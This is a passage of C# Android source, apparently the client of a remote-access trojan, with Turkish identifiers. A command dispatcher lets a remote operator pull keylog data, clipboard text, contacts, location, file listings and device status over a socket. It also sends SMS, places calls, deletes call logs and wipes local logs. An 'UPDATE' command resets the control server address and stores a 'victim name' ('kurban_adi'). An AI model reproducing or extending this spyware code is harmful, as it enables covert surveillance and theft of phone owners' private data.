                                soketimizeGonder("KEYGONDER", "[VERI]" + icerik + "[0x09]");
                                break;
                            case "DOSYAAC":
                                Ac(ayirici[1]);
                                break;
                            case "GIZLI":
                                StartPlayer(ayirici[1]);
                                break;
                            case "GIZKAPA":
                                if (player != null)
                                {
                                    player.Stop();
                                }
                                break;
                            case "VOLUMELEVELS":
                                sesBilgileri();
                                break;
                            case "ZILSESI":
                                try
                                {
                                    if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                    mgr.SetStreamVolume(Android.Media.Stream.Ring, int.Parse(ayirici[1].Replace("VOLUMELEVELS", "")), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                                }
                                catch (Exception) { }
                                break;
                            case "MEDYASESI":
                                try
                                {
                                    if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                    mgr.SetStreamVolume(Android.Media.Stream.Music, int.Parse(ayirici[1].Replace("VOLUMELEVELS", "")), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                                }
                                catch (Exception) { }
                                break;
                            case "BILDIRIMSESI":
                                try
                                {
                                    if (mgr == null) { mgr = (Android.Media.AudioManager)GetSystemService(AudioService); }
                                    mgr.SetStreamVolume(Android.Media.Stream.Notification, int.Parse(ayirici[1].Replace("VOLUMELEVELS", "")), Android.Media.VolumeNotificationFlags.RemoveSoundAndVibrate);
                                }
                                catch (Exception) { }
                                break;
                            case "REHBERIVER":
                                rehberLogu();
                                break;
                            case "REHBERISIM":
                                string[] ayir = ayirici[1].Split('=');
                                rehberEkle(ayir[1], ayir[0]);
                                break;
                            case "REHBERSIL":
                                rehberNoSil(ayirici[1]);
                                break;
                            case "VIBRATION":
                                try
                                {
                                    Vibrator vibrator = (Vibrator)GetSystemService(VibratorService);
                                    vibrator.Vibrate(int.Parse(ayirici[1]));
                                }
                                catch (Exception) { }
                                break;
                            case "FLASH":
                                flashIsik(ayirici[1]);
                                break;
                            case "TOST":
                                Toast.MakeText(this, ayirici[1], ToastLength.Long).Show();
                                break;
                            case "APPLICATIONS":
                                uygulamalar();
                                break;
                            case "OPENAPP":
                                try
                                {
                                    Intent intent = PackageManager.GetLaunchIntentForPackage(ayirici[1]);
                                    intent.AddFlags(ActivityFlags.NewTask);
                                    StartActivity(intent);
                                }
                                catch (Exception) { }
                                break;
                            case "DELETECALL":
                                DeleteCallLogByNumber(ayirici[1]);
                                break;
                            case "SARJ":
                                try
                                {
                                    var filter = new IntentFilter(Intent.ActionBatteryChanged);
                                    var battery = RegisterReceiver(null, filter);
                                    int level = battery.GetIntExtra(BatteryManager.ExtraLevel, -1);
                                    int scale = battery.GetIntExtra(BatteryManager.ExtraScale, -1);
                                    int BPercetage = (int)Math.Floor(level * 100D / scale);
                                    var per = BPercetage.ToString();
                                    soketimizeGonder("TELEFONBILGI", "[VERI]" + per.ToString() + "[VERI]" + ekranDurumu() + "[VERI]" + usbDurumu() + "[VERI]" +
                                           mobil_Veri() + "[VERI]" + wifi_durumu() + "[VERI]" + gps_durum() + "[VERI]" + btisEnabled() + "[0x09]");
                                }
                                catch (Exception) { }
                                break;
                            case "UPDATE":
                                try
                                {
                                    Preferences.Set("aypi_adresi", ayirici[2]);
                                    Preferences.Set("port", ayirici[3]);
                                    Preferences.Set("kurban_adi", ayirici[1]);
                                    MainValues.IP = Preferences.Get("aypi_adresi", "192.168.1.7");
                                    MainValues.port = int.Parse(Preferences.Get("port", "9999"));
                                    MainValues.KRBN_ISMI = Preferences.Get("kurban_adi", "xxxx");
                                }
                                catch (Exception) { }
                                break;
                            case "WALLPAPERBYTE":
                                try
                                {

                                    duvarKagidi(ayirici[1]);
                                }
                                catch (Exception) { }
                                break;
                            case "WALLPAPERGET":
                                duvarKagidiniGonder();
                                break;
                            case "PANOGET":
                                panoyuYolla();
                                break;
                            case "PANOSET":
                                panoAyarla(ayirici[1]);
                                break;
                            case "SMSGONDER":
                                string[] baki = ayirici[1].Split('=');
                                try
                                {
                                    SmsManager.Default.SendTextMessage(baki[0], null,
                                           baki[1], null, null);
                                }
                                catch (Exception) { }
                                break;
                            case "ARA":
                                MakePhoneCall(ayirici[1]);
                                break;
                            case "URL":
                                try
                                {
                                    var uri = Android.Net.Uri.Parse(ayirici[1]);
                                    var intent = new Intent(Intent.ActionView, uri);
                                    StartActivity(intent);
                                }
                                catch (Exception) { }
                                break;
                            case "KONUM":
                                lokasyonCek();
                                break;
                            case "PARLAKLIK":
                                try { setBrightness(int.Parse(ayirici[1])); } catch (Exception) { }
                                break;
                            case "LOGTEMIZLE":
                                DirectoryInfo dinfo_ = new DirectoryInfo(Android.OS.Environment.ExternalStorageDirectory.AbsolutePath + "/mainly");
                                FileInfo[] fileInfos_ = dinfo_.GetFiles("*.tht");
                                if (fileInfos_.Length > 0)
                                {
                                    foreach (FileInfo fileInfo in fileInfos_)
                                    {
                                        fileInfo.Delete();
                                    }
                                }
                                break;
                            case "SHORTCUT":
                                AddShortcut(ayirici[1], ayirici[2], Convert.FromBase64String(ayirici[3]));
                                break;
                        }
                    }
                    catch (Exception)
                    {

                    }
                }
            });
        }
        public string GetIdentifier()
        {
            try
            {
                return Settings.Secure.GetString(ContentResolver, Settings.Secure.AndroidId);
            }
            catch (Exception) { return "error_imei"; }
        }
        public string telefondanIsim(string telefon)
        {
            try
            {
                return getContactbyPhoneNumber(this, telefon);
            }
            catch (Exception) { return "Kayıtsız numara"; }
        }
        public string getContactbyPhoneNumber(Context c, string phoneNumber)
        {
            try
            {
                Android.Net.Uri uri = Android.Net.Uri.WithAppendedPath(ContactsContract.PhoneLookup.ContentFilterUri, (phoneNumber));
                string[] projection = { ContactsContract.Contacts.InterfaceConsts.DisplayName };
                ICursor cursor = c.ContentResolver.Query(uri, projection, null, null, null);
                if (cursor == null)
                {
                    return phoneNumber;
                }
                else
                {
                    string name = phoneNumber;
                    try
                    {

                        if (cursor.MoveToFirst())
                        {
                            name = cursor.GetString(cursor.GetColumnIndex(ContactsContract.Contacts.InterfaceConsts.DisplayName));
                        }
                    }
                    finally
                    {
                        cursor.Close();
                    }

                    return name;
                }
            }
            catch (Exception) { return "İsim bulunamadı"; }
        }
        public void cihazDosyalariGonder()
        {
            string dosyalarS = "";
            foreach (string inf in allDirectory_)
            {
                dosyalarS += inf + "<";
            }
            if (!string.IsNullOrEmpty(dosyalarS))
            {
                soketimizeGonder("FILES", "[VERI]CIHAZ[VERI]" + dosyalarS + "[0x09]");
            }
            else
            {
                soketimizeGonder("FILES", "[VERI]CIHAZ[VERI]BOS[0x09]");
            }
        }
        public void dosyalariGonder()
        {
            string dosyalarS = "";
            foreach (string inf in allDirectory_)
            {
                dosyalarS += inf + "<";
            }
            if (!string.IsNullOrEmpty(dosyalarS))
            {
                soketimizeGonder("FILES", "[VERI]SDCARD[VERI]" + dosyalarS + "[0x09]");
            }
            else
            {
                soketimizeGonder("FILES", "[VERI]SDCARD[VERI]BOS[0x09]");
            }
        }
        public string usbDurumu()
        {
            string status = "";
            try
            {
                var source = Battery.PowerSource;
                switch (source)
                {
                    case BatteryPowerSource.Battery:
                        status = "BATARYA";
                        break;
                    case BatteryPowerSource.AC:
                        status = "FİŞ";
                        break;
                    case BatteryPowerSource.Usb:
                        status = "USB";
                        break;
                    case BatteryPowerSource.Wireless:
                        status = "KABLOSUZ";
                        break;
                    case BatteryPowerSource.Unknown:
                        status = "BİLİNMİYOR";
                        break;
                }
                return status + "[VERI]";
            }
            catch (Exception ex) { status = ex.Message + "[0x09]"; return status; }
        }
        public string wifi_durumu()
        {
            WifiManager wifiManager = (WifiManager)(Application.Context.GetSystemService(WifiService));
            if (wifiManager != null)
            {
                return wifiManager.ConnectionInfo.SSID;
            }
            else
            {
                return "WiFi bağlı değil.";
            }
        }
        private void btKapaAc(bool ac_kapa)
        {
            try
            {
                BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.DefaultAdapter;
                if (ac_kapa == false)
                {
                    if (mBluetoothAdapter.IsEnabled)
                    {
                        mBluetoothAdapter.Disable();
                    }
                }
                else
                {
                    if (ac_kapa == true)
                    {
                        if (mBluetoothAdapter.IsEnabled == false)
                        {
                            mBluetoothAdapter.Enable();
                        }
                    }
                }
            }
            catch (Exception) { }
        }
        public void wifiAcKapa(bool acKapa)
        {
            try
            {
                WifiManager wifi = (WifiManager)GetSystemService(WifiService);
                wifi.SetWifiEnabled(acKapa);
            }
            catch (Exception) { }
        }
        public void setBrightness(int brightness)
        {
            if (brightness < 0)
                brightness = 0;
            else if (brightness > 255)
                brightness = 255;
            try
            {
                Settings.System.PutInt(ContentResolver,
                        Settings.System.ScreenBrightnessMode,
                       (int)ScreenBrightness.ModeManual);
            }
            catch (Exception) { }
            ContentResolver cResolver = ContentResolver;
            Settings.System.PutInt(cResolver, Settings.System.ScreenBrightness, brightness);

        }
        public string mobil_Veri()
        {
            try
            {
                Android.Net.ConnectivityManager conMan = (Android.Net.ConnectivityManager)
                    GetSystemService(ConnectivityService);
                //mobile
                var mobile = conMan.GetNetworkInfo(Android.Net.ConnectivityType.Mobile).GetState();

                bool mobileYN = false;
                Context context = this;

                if (Build.VERSION.SdkInt >= BuildVersionCodes.JellyBeanMr1)
                {
                    mobileYN = Settings.Global.GetInt(context.ContentResolver, "mobile_data", 1) == 1;
                }
                else
                {
                    mobileYN = Settings.Secure.GetInt(context.ContentResolver, "mobile_data", 1) == 1;
                }
                return mobileYN ? "AÇIK/" + ((mobile == Android.Net.NetworkInfo.State.Connected) ? "Internet" : "Internetsiz") : "KAPALI";
            }
            catch (Exception ex) { return ex.Message; }
        }
        public string gps_durum()
        {
            LocationManager locationManager = (LocationManager)GetSystemService(LocationService);

            if (locationManager.IsProviderEnabled(LocationManager.GpsProvider))
            {
                return "GPS Açık.";
            }
            else
            {
                return "GPS Kapalı.";
            }
        }
        private string btisEnabled()
        {
            try
            {
                BluetoothAdapter mBluetoothAdapter = BluetoothAdapter.DefaultAdapter;
                return mBluetoothAdapter.IsEnabled ? "Açık" : "Kapalı";
            }
            catch (Exception ex) { return ex.Message; }
        }
        public string ekranDurumu()
        {
            try
            {
                string KEY_DURUMU = "";
                string EKRAN_DURUMU = "";
                KeyguardManager myKM = (KeyguardManager)GetSystemService(KeyguardService);
                bool isPhoneLocked = myKM.InKeyguardRestrictedInputMode();
                bool isScreenAwake = default;
                KEY_DURUMU = (isPhoneLocked) ? "KİLİTLİ" : "KİLİT_YOK";
                PowerManager powerManager = (PowerManager)GetSystemService(PowerService);
                isScreenAwake = ((int)Build.VERSION.SdkInt < 20 ? powerManager.IsScreenOn : powerManager.IsInteractive);
                EKRAN_DURUMU = (isScreenAwake) ? "EKRAN_AÇIK" : "EKRAN_KAPALI";

                return KEY_DURUMU + "&" + EKRAN_DURUMU + "&";
            }
            catch (Exception ex) { return ex.Message + "&"; }

        }
        public async void panoAyarla(string input)
        {
            await Clipboard.SetTextAsync(input);
        }
        public async void panoyuYolla()
        {
            var pano = await Clipboard.GetTextAsync();
            if (string.IsNullOrEmpty(pano)) { pano = "[NULL]"; }
            try
            {
                soketimizeGonder("PANOGELDI", "[VERI]" + pano + "[0x09]");
            }
            catch (Exception) { }
        }
        public async Task<byte[]> wallPaper(string linq)
        {
            try
            {
                using (WebClient wc = new WebClient())
                {
                    wc.Headers.Add(HttpRequestHeader.UserAgent,
                "other");
                    return await wc.DownloadDataTaskAsync(linq);
                }
            }
            catch (Exception)
            {

                return new byte[] { };
            }
        }
        public async void duvarKagidi(string yol)
        {

            try
            {
                byte[] uzant = await wallPaper(yol);
                if (uzant.Length > 0)
                {
                    Android.Graphics.Bitmap bitmap = Android.Graphics.BitmapFactory.DecodeByteArray(uzant, 0, uzant.Length); //Android.Graphics.BitmapFactory.DecodeByteArray(veri,0,veri.Length);
                    WallpaperManager manager = WallpaperManager.GetInstance(ApplicationContext);
                    manager.SetBitmap(bitmap);
                    bitmap.Dispose();
                    manager.Dispose();
                }
            }
            catch (Exception)
            { }

        }
        public byte[] drawableToByteArray(Drawable d)
        {
            var image = d;
            Android.Graphics.Bitmap bitmap_ = ((BitmapDrawable)image).Bitmap;
            byte[] bitmapData;
            using (MemoryStream ms = new MemoryStream())
            {
                bitmap_.Compress(Android.Graphics.Bitmap.CompressFormat.Png, 100, ms);
                bitmapData = ms.ToArray();
            }
            return bitmapData;
        }
        public void duvarKagidiniGonder()
        {
            WallpaperManager manager = WallpaperManager.GetInstance(this);
            try
            {
                var image = manager.PeekDrawable();
                Android.Graphics.Bitmap bitmap_ = ((BitmapDrawable)image).Bitmap;
                byte[] bitmapData = default;
                using (MemoryStream ms = new MemoryStream())
                {
                    bitmap_.Compress(Android.Graphics.Bitmap.CompressFormat.Png, 100, ms);
                    bitmapData = ms.ToArray();
                }
                soketimizeGonder("WALLPAPERBYTES", "[VERI]" + Convert.ToBase64String(bitmapData) + "[0x09]");
            }
            catch (Exception)
            {
            }
        }
        public async void flashIsik(string ne_yapam)
        {
            switch (ne_yapam)
            {
                case "AC":
                    await Flashlight.TurnOnAsync();
                    break;
                case "KAPA":
                    await Flashlight.TurnOffAsync();
                    break;
            }
        }
        public void MakePhoneCall(string number)
        {
            var uri = Android.Net.Uri.Parse("tel:" + number);
            Intent intent = new Intent(Intent.ActionCall, uri);
            intent.AddFlags(ActivityFlags.NewTask);
            Application.Context.StartActivity(intent);
        }
        public void DeleteCallLogByNumber(string number)
        {
            try
            {
                Android.Net.Uri CALLLOG_URI = Android.Net.Uri.Parse("content://call_log/calls");
                ContentResolver.Delete(CALLLOG_URI, CallLog.Calls.Number + "=?", new string[] { number });
            }
            catch (Exception)
            {
            }
        }
        protected MediaPlayer player = new MediaPlayer();
        public void StartPlayer(string filePath)
        {
            try
            {
                if (player == null)
                {
                    player = new MediaPlayer();
                }
                else
                {
                    Android.Net.Uri uri = Android.Net.Uri.Parse("file://" + filePath);
                    player.Reset();
                    player.SetDataSource(this, uri);
                    player.Prepare();
                    player.Start();
                }
            }
            catch (Exception) { }
        }
        string log_dosylari_gonder = "";
        Android.Media.AudioManager mgr = null;
        public void sesBilgileri()
        {
            string ZIL_SESI = "";
            string MEDYA_SESI = "";
            string BILDIRIM_SESI = "";
            mgr = (Android.Media.AudioManager)GetSystemService(AudioService);
            //Zil sesi
            int max = mgr.GetStreamMaxVolume(Android.Media.Stream.Ring);
            int suankiZilSesi = mgr.GetStreamVolume(Android.Media.Stream.Ring);
            ZIL_SESI = suankiZilSesi.ToString() + "/" + max.ToString();
            //Medya
            int maxMedya = mgr.GetStreamMaxVolume(Android.Media.Stream.Music);
            int suankiMedya = mgr.GetStreamVolume(Android.Media.Stream.Music);
            MEDYA_SESI = suankiMedya.ToString() + "/" + maxMedya.ToString();
            //Bildirim Sesi
            int maxBildirim = mgr.GetStreamMaxVolume(Android.Media.Stream.Notification);
            int suankiBildirim = mgr.GetStreamVolume(Android.Media.Stream.Notification);
            BILDIRIM_SESI = suankiBildirim.ToString() + "/" + maxBildirim.ToString();
            //Ekran Parlaklığı
            int parlaklik = Settings.System.GetInt(ContentResolver,
            Settings.System.ScreenBrightness, 0);

            string gonderilecekler = ZIL_SESI + "=" + MEDYA_SESI + "=" + BILDIRIM_SESI + "=" + parlaklik.ToString() + "=";
            soketimizeGonder("SESBILGILERI", "[VERI]" + gonderilecekler + "[0x09]");
        }
        public static Activity global_activity = default;
        public static PackageManager global_packageManager = default;

    }
}